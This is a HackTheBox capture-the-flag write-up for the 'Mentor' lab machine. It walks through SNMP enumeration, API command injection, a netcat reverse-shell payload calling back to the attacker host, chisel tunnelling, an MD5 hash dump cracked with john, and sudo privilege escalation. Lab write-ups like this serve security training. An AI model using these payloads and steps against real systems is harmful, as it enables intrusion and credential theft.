# Mentor - HackTheBox - Writeup
Linux, 30 Base Points, Medium

![info.JPG](images/info.JPG)

## Machine

![‏‏Mentor.JPG](images/Mentor.JPG)
 
## TL;DR

To solve this machine, we start by using `nmap` to enumerate open services and find ports `22`, `80`, and `161`.

***User***: Using `snmpwalk`, we were able to find password. We then discovered the virtual host `api.mentorquotes.htb`, which contained Swagger documentation. With the password we found using `snmpwalk`, we accessed the `/admin/backup` API as the user `james`. We found a command injection vulnerability on `/admin/backup`. Using this vulnerability, we were able to gain a reverse shell as `root` to the container. We created a TCP tunnel using `chisel` to access `PostgreSQL` and found the password for the `svc` user in the users table.

***Root***: We found the password for the `james` user in `/etc/snmp/snmp.conf`. We then ran `/bin/sh` as root and were able to obtain the `root` flag.

![pwn.JPG](images/pwn.JPG)


## Mentor Solution

### User

Let's begin by using `nmap` to scan the target machine:
```console
┌─[evyatar9@parrot]─[/hackthebox/Mentor]
└──╼ $ nmap -sV -sC -oA nmap/Mentor 10.10.11.193
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-10 23:03 IST
Nmap scan report for 10.10.11.193
Host is up (0.074s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Continue with `UDP` scanning:
```console
┌─[evyatar9@parrot]─[/hackthebox/Mentor]
└──╼ $ sudo nmap -sU mentorquotes.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-10 23:13 IST
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.072s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp

Nmap done: 1 IP address (1 host up) scanned in 106.21 seconds

```

We observe two interesting ports: `HTTP` and `SNMP`.

We will now execute `snmpwalk` to gather further information:
```console
┌─[evyatar9@parrot]─[/hackthebox/Mentor]
└──╼ $ snmpwalk -v2c -c internal mentorquotes.htb
iso.3.6.1.2.1.1.1.0 = STRING: "Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (33547) 0:05:35.47
iso.3.6.1.2.1.1.4.0 = STRING: "Me <admin@mentorquotes.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "mentor"
...
iso.3.6.1.2.1.25.4.2.1.5.2131 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
```

We have identified a username, `admin` and a potential password, `kj23sadkj123as0-d213` in the file `login.py`.

Upon examination of port `80` (http://mentorquotes.htb/), we find a hosted web page:

![port80.JPG](images/port80.JPG)

`gobuster` was executed and revealed the following virtual hosts (vhosts):
```console
┌─[evyatar9@parrot]─[/hackthebox/Mentor]
└──╼ $ gobuster vhost -u http://mentorquotes.htb/ -w ./subdomains-top1milion.txt -o vho -t 80
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://mentorquotes.htb/
[+] Method:       GET
[+] Threads:      80
[+] Wordlist:     ./subdomains-top1milion.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/01/10 23:33:13 Starting gobuster in VHOST enumeration mode
===============================================================
Found: api.mentorquotes.htb (Status: 404) [Size: 22]
....

```

We will now attempt to discover useful paths on the virtual host `api` by running gobuster again (after adding `api.mentorquotes.htb` to the file `/etc/hosts`):
```console
┌─[evyatar9@parrot]─[/hackthebox/Mentor]
└──╼ $ gobuster dir -u http://api.mentorquotes.htb/ -x php -w ./raft-medium-words.txt -t 100 -k --wildcard -o preprod.gobuster
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api.mentorquotes.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                ./raft-medium-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/01/10 23:39:26 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/admin/]
/docs                 (Status: 200) [Size: 969]                                       
/users                (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/users/]
/quotes               (Status: 307) [Size: 0] [--> http://api.mentorquotes.htb/quotes/]
/server-status        (Status: 403) [Size: 285]                                        
/amenities            (Status: 502) [Size: 427]                                        
/managecart.php       (Status: 502) [Size: 427]                                        
/montada              (Status: 502) [Size: 427]                                        
/moore                (Status: 502) [Size: 427]                                        
/bb2.php              (Status: 502) [Size: 427]                                        
/meinv.php            (Status: 502) [Size: 427]                                        
/popup_photos         (Status: 502) [Size: 427]                                        
/pnr                  (Status: 502) [Size: 427]   

```

We have discovered that the paths `/admin `, `/users`, `/qoutes`, and `/docs` return a response code of `200`. Upon examination of the path `/docs`, we find that it utilizes the tool [Swagger](https://swagger.io/): 

![docs.JPG](images/docs.JPG)

*The `Send email to james` button sends mail to `james@mentorquotes.htb`.

We will now use the `auth/signup` API to create a new account: 

![signup.JPG](images/signup.JPG)

We will now use the `auth/login` API to log in: 

![login.JPG](images/login.JPG)

The result of this action is the following response:

![loginresponse.JPG](images/loginresponse.JPG)

We have obtained the following token: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImV2eWF0YXI5IiwiZW1haWwiOiJldnlhdGFyOUBtZW50b3JxdW90ZXMuaHRiIn0.rzIkbAxscZrMPTyzleNaPNtomwXOvEkce-D5iYvNW1I`.

We will now decode this token using the website https://jwt.io/:

![jwtio.JPG](images/jwtio.JPG)

When attempting to access the `/users` API, the following error was encountered:
```HTTP
HTTP/1.1 403 Forbidden
Date: Sat, 14 Jan 2023 20:20:15 GMT
Server: uvicorn
content-length: 54
content-type: application/json
Connection: close

{"detail":"Only admin users can access this resource"}
```

We have obtained the password for the `admin` user from the output of `snmpwalk` and discovered another user `james`.

We will now attempt to use the `admin` password to authenticate:
```HTTP
POST /auth/login HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api.mentorquotes.htb/docs
Content-Type: application/json
Origin: http://api.mentorquotes.htb
Content-Length: 95
DNT: 1
Connection: close

{
  "email": "admin@mentorquotes.htb",
  "username": "admin",
  "password": "kj23sadkj123as0-d213"
}
```

Response:
```HTTP
HTTP/1.1 403 Forbidden
Date: Sat, 14 Jan 2023 20:25:57 GMT
Server: uvicorn
content-length: 158
content-type: application/json
access-control-allow-origin: *
access-control-allow-credentials: true
Connection: close

{"detail":"Not authorized!"}
```

Trying with `james` user:
```HTTP
POST /auth/login HTTP/1.1
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api.mentorquotes.htb/docs
Content-Type: application/json
Origin: http://api.mentorquotes.htb
Content-Length: 95
DNT: 1
Connection: close

{
  "email": "james@mentorquotes.htb",
  "username": "james",
  "password": "kj23sadkj123as0-d213"
}
```

Response:
```HTTP
HTTP/1.1 200 OK
Date: Sat, 14 Jan 2023 20:35:33 GMT
Server: uvicorn
content-length: 154
content-type: application/json
access-control-allow-origin: *
access-control-allow-credentials: true
Connection: close

"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
```

We can now attempt to access the /users API again:
```HTTP
GET /users/ HTTP/1.1
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api.mentorquotes.htb/users
DNT: 1
Connection: close
Content-Length: 2

```

Response:
```HTTP
HTTP/1.1 201 Created
Date: Sat, 14 Jan 2023 20:45:17 GMT
Server: uvicorn
content-length: 192
content-type: application/json
Connection: close

[{"id":1,"email":"james@mentorquotes.htb","username":"james"},{"id":2,"email":"svc@mentorquotes.htb","username":"service_acc"},{"id":4,"email":"evyatar9@mentorquotes.htb","username":"evyatar9"}]

```

We can attempt to access the `/admin` API:
```HTTP
GET /admin/ HTTP/1.1
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api.mentorquotes.htb/users
DNT: 1
Connection: close
Content-Length: 2

```

Response:
```HTTP
HTTP/1.1 200 OK
Date: Sat, 14 Jan 2023 21:06:38 GMT
Server: uvicorn
content-length: 83
content-type: application/json
Connection: close

{"admin_funcs":{"check db connection":"/check","backup the application":"/backup"}}
```

We have identified two endpoint in the `/admin` API, `/admin/check` and `/admin/backup`. Let's navigate to the `/admin/check` endpoint:
```HTTP
HTTP/1.1 200 OK
Date: Sat, 14 Jan 2023 20:50:09 GMT
Server: uvicorn
content-length: 34
content-type: application/json
Connection: close

{"details":"Not implemented yet!"}
```

Browse to `/admin/check`:
```HTTP
HTTP/1.1 405 Method Not Allowed
Date: Sat, 14 Jan 2023 20:52:03 GMT
Server: uvicorn
content-length: 31
content-type: application/json
Connection: close

{"detail":"Method Not Allowed"}
```

We will now attempt to use the POST method while sending an empty `JSON` object to the endpoint:
```HTTP
POST /admin/backup HTTP/1.1
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
Host: api.mentorquotes.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api.mentorquotes.htb/docs
Content-Type: application/json
Origin: http://api.mentorquotes.htb
Content-Length: 6
DNT: 1
Connection: close

{}
```

Response:
```HTTP
HTTP/1.1 422 Unprocessable Entity
Date: Sun, 15 Jan 2023 20:55:49 GMT
Server: uvicorn
content-length: 88
content-type: application/json
access-control-allow-origin: *
access-control-allow-credentials: true
Connection: close

{"detail":[{"loc":["body","path"],"msg":"field required","type":"value_error.missing"}]}
```

We have noticed that the request is missing the required field `path`, which appears to be the destination for the backup. We will now include this field in the body of the request:
```json
{
  "path": "/etc/passwd"
}
```

Response:
```HTTP
HTTP/1.1 200 OK
Date: Sun, 15 Jan 2023 20:28:13 GMT
Server: uvicorn
content-length: 16
content-type: application/json
access-control-allow-origin: *
access-control-allow-credentials: true
Connection: close

{"INFO":"Done!"}
```

By sending the following JSON in the `path` field, we have discovered that it allows for command injection vulnerabilities:
```json
{
  "path": "/etc/passwd;ping -c1 10.10.14.14;"
}
```

We will now attempt to exploit the command injection vulnerability by sending a payload in the form of a `JSON` object, in order to gain a reverse shell:
```json
{
"path": ";/etc/passwd;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 443 >/tmp/f;"
}
```

We have successfully obtained a reverse shell:
```console
┌─[evyatar9@parrot]─[/hackthebox/Mentor]
└──╼ $ sudo nc -lvvvp 443
listening on [any] 443 ...
connect to [10.10.14.14] from mentorquotes.htb [10.10.11.193] 36373
/bin/sh: can't access tty; job control turned off
/app # ls
Dockerfile
app
requirements.txt
/app # whoami
root
/app # ls /home
svc
/app # cd /home/svc
/home/svc # ls
user.txt
/home/svc # cat user.txt
8cffdce62939331fd656b55bfc4ee0a8
```

And we get the user flag `8cffdce62939331fd656b55bfc4ee0a8`.

As we are inside a container, we have obtained root access. By performing further enumeration on the container, we have discovered a file `db.py`:
```python
/app/app # cat db.py
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

....
```

We have several options for connecting to `PostgreSQL` database. One option is to write a `Python` script that connects to the database. Another option is to use TCP tunneling.

We will use TCP tunneling with [chisel](https://github.com/jpillora/chisel).

To use `Chisel`, we will run the command `chisel server` on our machine:
```console
┌─[evyatar9@parrot]─[/hackthebox/Mentor]
└──╼ $ ./chisel server --reverse --port 4242
2023/01/15 23:03:28 server: Reverse tunnelling enabled
2023/01/15 23:03:28 server: Fingerprint yAXxn4kTCR/7Lx9cDqdokVxSwxb8sYRYHKgmHzgKo88=
2023/01/15 23:03:28 server: Listening on http://0.0.0.0:4242

```

Additionally, we will run `Chisel` on the container to forward the `PostgreSQL` port (`5432`) in order to establish a connection to the database:
```console
/tmp # ./chisel client -v 10.10.14.13:4242 R:5432:172.22.0.1:5432 &
/tmp # 2023/01/15 21:14:49 client: Connecting to ws://10.10.14.13:4242
2023/01/15 21:14:49 client: Handshaking...
2023/01/15 21:14:49 client: Sending config
2023/01/15 21:14:49 client: Connected (Latency 71.964622ms)
2023/01/15 21:14:49 client: tun: SSH connected

```

By using Chisel, we can now access the `PostgreSQL` database by specifying the appropriate host and port in the connection settings:
```console
┌─[evyatar9@parrot]─[/hackthebox/Mentor]
└──╼ $ psql -h 127.0.0.1 -p 5432 -U postgres -W
Password: 
psql (13.8 (Debian 13.8-0+deb11u1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

postgres=# postgres-# \list
                                    List of databases
      Name       |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges   
-----------------+----------+----------+------------+------------+-----------------------
 mentorquotes_db | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 postgres        | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 template0       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
                 |          |          |            |            | postgres=CTc/postgres
 template1       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
                 |          |          |            |            | postgres=CTc/postgres
(4 rows)

```

We can then browse the `mentorquotes_db` database:
```console
postgres-# \c mentorquotes_db
Password: 
psql (13.8 (Debian 13.8-0+deb11u1), server 13.7 (Debian 13.7-1.pgdg110+1))
You are now connected to database "mentorquotes_db" as user "postgres".
mentorquotes_db-# \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)

mentorquotes_db-# 
```

Select from `users` table:
```console
mentorquotes_db=# SELECT * FROM users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
(2 rows)

mentorquotes_db=# 
```

We can observe the hash of the `james` and `svc` users. To crack the hash of the `svc` user, we can use `john`:
```console
┌─[evyatar9@parrot]─[/hackthebox/Mentor]
└──╼ $ john --wordlist=~/Desktop/rockyou.txt --format=Raw-MD5 hash
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
123meunomeeivani (?)
1g 0:00:00:01 DONE (2023-01-15 23:24) 0.7407g/s 10624Kp/s 10624Kc/s 20494KC/s  filimani..evevev
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
┌─[evyatar9@parrot]─[/hackthebox/Mentor]
└──╼ $ john --show --format=Raw-MD5 hash
?:123meunomeeivani

1 password hash cracked, 1 left 

```

By using `john` to crack the hash of the `svc` user, we are able to obtain the password `123meunomeeivani`. This can be used to connect via SSH:
```console
┌─[evyatar9@parrot]─[/hackthebox/Mentor]
└──╼ $ ssh svc@mentorquotes.htb 
The authenticity of host 'mentorquotes.htb (10.10.11.193)' can't be established.
ECDSA key fingerprint is SHA256:LcgP58TDSwAB3WI9Z0DdTh+561t6MKI61ygC9CN0Qrg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'mentorquotes.htb,10.10.11.193' (ECDSA) to the list of known hosts.
svc@mentorquotes.htb's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jan 15 09:26:36 PM UTC 2023

  System load:                      0.02978515625
  Usage of /:                       65.2% of 8.09GB
  Memory usage:                     14%
  Swap usage:                       0%
  Processes:                        253
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.193
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:cb4f

  => There are 2 zombie processes.


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
svc@mentor:~$ 
```

### Root

Through enumeration of the machine, we were able to locate the password in the `/etc/snmp/snmp.conf` file:
```console
svc@mentor:/etc/snmp$ cat  snmpd.conf 
###########################################################################
#
# snmpd.conf
# An example configuration file for configuring the Net-SNMP agent ('snmpd')
# See snmpd.conf(5) man page for details
#
###########################################################################
# SECTION: System Information Setup
#

....
createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv
...

```

We can use the password found in `/etc/snmp/snmp.conf` file for the `james` user:
```console
svc@mentor:/etc/snmp$ su james
Password: 
james@mentor:/etc/snmp$
```

We can run the command `sudo -l` to check the level of access the current user have, and it will list the commands that the user is allowed to run with superuser privileges:
```console
james@mentor:/etc/snmp$ sudo -l
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
```

By running the command `sudo -l`, we can see that we have the ability to run `/bin/sh` as the `root` user, which gives us the highest level of access to the system:
```console
james@mentor:/etc/snmp$ sudo /bin/sh
# whoami
root
# cat /root/root.txt
f25c835baa1c8249b2eece11e911118e
```

And we get the root flag `f25c835baa1c8249b2eece11e911118e`.
